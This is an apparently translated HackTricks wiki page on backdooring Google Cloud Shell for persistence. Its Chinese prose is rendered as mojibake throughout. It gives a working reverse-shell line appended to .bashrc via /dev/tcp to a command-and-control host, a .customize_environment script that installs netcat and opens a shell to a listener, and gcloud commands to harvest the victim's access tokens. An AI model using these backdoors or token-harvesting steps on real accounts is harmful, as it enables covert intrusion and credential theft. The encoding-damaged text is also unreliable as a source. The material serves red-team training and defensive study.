# GCP - Cloud Shell Persistence

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## Cloud Shell

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### æŒä¹…åé—¨

[**Google Cloud Shell**](https://cloud.google.com/shell/) è®©æ‚¨å¯ä»¥ç›´æ¥ä»æµè§ˆå™¨è®¿é—®äº‘èµ„æºçš„å‘½ä»¤è¡Œï¼Œæ— éœ€ä»»ä½•ç›¸å…³è´¹ç”¨ã€‚

æ‚¨å¯ä»¥é€šè¿‡ **Web æ§åˆ¶å°** æˆ–è¿è¡Œ **`gcloud cloud-shell ssh`** è®¿é—® Google çš„ Cloud Shellã€‚

æ­¤æ§åˆ¶å°å¯¹æ”»å‡»è€…å…·æœ‰ä¸€äº›æœ‰è¶£çš„åŠŸèƒ½ï¼š

1. **ä»»ä½•æœ‰æƒè®¿é—® Google Cloud çš„ Google ç”¨æˆ·** éƒ½å¯ä»¥è®¿é—®ä¸€ä¸ªå®Œå…¨è®¤è¯çš„ Cloud Shell å®ä¾‹ï¼ˆæœåŠ¡è´¦æˆ·å³ä½¿æ˜¯ç»„ç»‡çš„æ‰€æœ‰è€…ä¹Ÿå¯ä»¥ï¼‰ã€‚
2. å¦‚æœæ²¡æœ‰æ´»åŠ¨ï¼Œè¯¥å®ä¾‹å°† **è‡³å°‘ä¿æŒå…¶ä¸»ç›®å½• 120 å¤©**ã€‚
3. ç»„ç»‡ **æ— æ³•ç›‘æ§** è¯¥å®ä¾‹çš„æ´»åŠ¨ã€‚

è¿™åŸºæœ¬ä¸Šæ„å‘³ç€æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„ä¸»ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåé—¨ï¼Œåªè¦ç”¨æˆ·æ¯ 120 å¤©è‡³å°‘è¿æ¥ä¸€æ¬¡ GC Shellï¼Œåé—¨å°±ä¼šå­˜æ´»ï¼Œæ”»å‡»è€…æ¯æ¬¡è¿è¡Œæ—¶éƒ½ä¼šè·å¾—ä¸€ä¸ª shellï¼Œåªéœ€æ‰§è¡Œï¼š

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

åœ¨ä¸»æ–‡ä»¶å¤¹ä¸­è¿˜æœ‰å¦ä¸€ä¸ªæ–‡ä»¶å«åš **`.customize_environment`**ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°†ä¼šåœ¨ç”¨æˆ·è®¿é—® **cloud shell** æ—¶ **æ¯æ¬¡æ‰§è¡Œ**ï¼ˆå°±åƒåœ¨å‰é¢çš„æŠ€æœ¯ä¸­ä¸€æ ·ï¼‰ã€‚åªéœ€æ’å…¥ä¹‹å‰çš„åé—¨æˆ–ç±»ä¼¼ä»¥ä¸‹çš„å†…å®¹ï¼Œä»¥ä¿æŒæŒä¹…æ€§ï¼Œåªè¦ç”¨æˆ·â€œé¢‘ç¹â€ä½¿ç”¨ cloud shellï¼š
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ**ç¬¬ä¸€æ¬¡æ‰§è¡Œéœ€è¦èº«ä»½éªŒè¯çš„æ“ä½œæ—¶**ï¼Œç”¨æˆ·çš„æµè§ˆå™¨ä¸­ä¼šå‡ºç°ä¸€ä¸ªå¼¹å‡ºæˆæƒçª—å£ã€‚å¿…é¡»æ¥å—æ­¤çª—å£æ‰èƒ½è¿è¡Œå‘½ä»¤ã€‚å¦‚æœå‡ºç°æ„å¤–çš„å¼¹å‡ºçª—å£ï¼Œå¯èƒ½ä¼šå¼•èµ·æ€€ç–‘ï¼Œå¹¶å¯èƒ½å±åŠæ‰€ä½¿ç”¨çš„æŒä¹…æ€§æ–¹æ³•ã€‚
{% endhint %}

è¿™æ˜¯ä»äº‘ç»ˆç«¯ï¼ˆä½œä¸ºæ”»å‡»è€…ï¼‰æ‰§è¡Œ `gcloud projects list` æ—¶åœ¨æµè§ˆå™¨ç”¨æˆ·ä¼šè¯ä¸­æŸ¥çœ‹çš„å¼¹å‡ºçª—å£ï¼š

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

ç„¶è€Œï¼Œå¦‚æœç”¨æˆ·å·²ä¸»åŠ¨ä½¿ç”¨äº‘ç»ˆç«¯ï¼Œåˆ™ä¸ä¼šå‡ºç°å¼¹å‡ºçª—å£ï¼Œæ‚¨å¯ä»¥**é€šè¿‡ä»¥ä¸‹æ–¹å¼æ”¶é›†ç”¨æˆ·çš„ä»¤ç‰Œ**ï¼š
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### SSHè¿æ¥çš„å»ºç«‹æ–¹å¼

åŸºæœ¬ä¸Šï¼Œä½¿ç”¨è¿™3ä¸ªAPIè°ƒç”¨ï¼š

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST]ï¼ˆå°†ä½¿æ‚¨æ·»åŠ æ‚¨æœ¬åœ°åˆ›å»ºçš„å…¬é’¥ï¼‰
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST]ï¼ˆå°†ä½¿æ‚¨å¯åŠ¨å®ä¾‹ï¼‰
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET]ï¼ˆå°†å‘Šè¯‰æ‚¨google cloud shellçš„IPï¼‰

ä½†æ‚¨å¯ä»¥åœ¨[https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)æ‰¾åˆ°æ›´å¤šä¿¡æ¯ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
